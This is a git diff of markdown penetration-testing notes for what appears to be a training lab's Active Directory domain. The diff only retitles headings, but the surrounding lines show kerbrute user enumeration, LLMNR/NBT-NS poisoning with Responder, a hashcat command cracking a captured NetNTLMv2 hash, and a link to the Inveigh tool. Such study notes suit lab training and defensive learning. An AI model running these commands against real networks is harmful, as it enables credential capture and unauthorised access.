@@ -70,6 +70,8 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 ```
 
 # Sniffing out a Foothold
+
+## LLMNR/NBT-NS Poisoning
 [Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. 
 
 LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over `UDP` natively. 
@@ -98,7 +100,7 @@ Let's walk through a quick example of the attack flow at a very high level:
 
 
 
-## LLMNR/NBT-NS Poisoning - from Linux
+### LLMNR/NBT-NS Poisoning - from Linux
 
 ```shell 
 sudo responder -I ens224
@@ -113,7 +115,7 @@ crack the hash
  .\hashcat.exe -m 5600 "backupagent::INLANEFREIGHT:2294b990eee35ab0:C2D891F417EBB1E1187877CED230DDED:01010000000000000022B6703BA9DA01E2423A941650ABDB00000000020008004200430058004A0001001E00570049004E002D0047004D0039005600410033003000330030004E00580004003400570049004E002D0047004D0039005600410033003000330030004E0058002E004200430058004A002E004C004F00430041004C00030014004200430058004A002E004C004F00430041004C00050014004200430058004A002E004C004F00430041004C00070008000022B6703BA9DA01060004000200000008003000300000000000000000000000003000001CA7B9124B30F944D887B56A197F9EA349F4808891ECE19A9D46EBFB7856355A0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" .\wordlists\rockyou.txt
 ```
 
-## LLMNR/NBT-NS Poisoning - from Windows
+##### LLMNR/NBT-NS Poisoning - from Windows
 - [Inveigh powershell version ](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)
 
 
